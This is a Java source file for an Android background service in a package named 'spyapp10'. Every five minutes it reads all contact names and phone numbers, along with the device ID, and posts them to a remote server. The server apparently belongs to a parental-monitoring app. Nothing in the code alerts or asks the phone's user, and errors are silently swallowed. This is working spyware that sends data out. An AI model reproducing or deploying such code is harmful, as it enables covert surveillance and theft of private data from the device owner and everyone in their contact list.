package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class contactListService extends Service {
    public contactListService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        readContact();
                        sleep(300000);
                    } catch (Exception e) {
                    }
                }
            }
        };
        runnable.start();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void readContact() {
        String number ="";
        String name="";
        try {

            Log.e("myservice", "contactServiceStarted");
            Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            cur.moveToFirst();
            while (!cur.isLast()) {
                name += cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+"||";
                number += cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))+"||";
                cur.moveToNext();
            }
            String DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
            String Email=MainActivity.EMAIL;

            Log.e("myservice",name);
            new UpdateUserDetailCONTACT().execute(Email, DeviceId, name, number);
        } catch (Exception e) {
        }
    }private class UpdateUserDetailCONTACT extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/cont.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(4);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("name", params[2]));
                nameValuePair.add(new BasicNameValuePair("phone", params[3]));
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}
